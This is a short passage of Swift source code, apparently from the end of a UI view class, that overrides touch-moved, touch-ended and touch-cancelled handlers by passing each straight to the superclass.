    open override func nsuiTouchesMoved(_ touches: Set<NSUITouch>, withEvent event: NSUIEvent?)
    {
        super.nsuiTouchesMoved(touches, withEvent: event)
    }
    
    open override func nsuiTouchesEnded(_ touches: Set<NSUITouch>, withEvent event: NSUIEvent?)
    {
        super.nsuiTouchesEnded(touches, withEvent: event)
    }
    
    open override func nsuiTouchesCancelled(_ touches: Set<NSUITouch>?, withEvent event: NSUIEvent?)
    {
        super.nsuiTouchesCancelled(touches, withEvent: event)
    }
}
